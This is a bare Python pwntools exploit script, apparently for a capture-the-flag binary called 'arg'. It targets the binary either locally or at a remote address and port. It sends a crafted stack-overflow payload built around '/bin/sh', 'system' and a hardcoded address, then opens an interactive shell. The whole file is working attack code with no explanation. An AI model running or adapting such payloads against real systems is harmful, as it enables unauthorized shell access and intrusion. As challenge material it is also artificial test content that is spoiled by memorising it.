#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process(['./arg'],env={"LD_PRELOAD":"/lib32/libc.so.6"})
	elf = ELF("./arg")
else:
	p = remote('183.129.189.60',10007)
	elf = ELF("./arg")

gdb.attach(p,'b *0x80487DE')

payload = '/bin/sh\x00' + 'A' * (0x3A - 0x1C - 0x8)
payload+= 'system' + '\x00' * (0x18 - 0x10 - 0x2)
payload+= 'okok' + p32(0x0804A0A0)
payload+= 'A' * (0x8+0x8) + p32(0xdeadbeef)

sla('your input : ',payload)

ia()
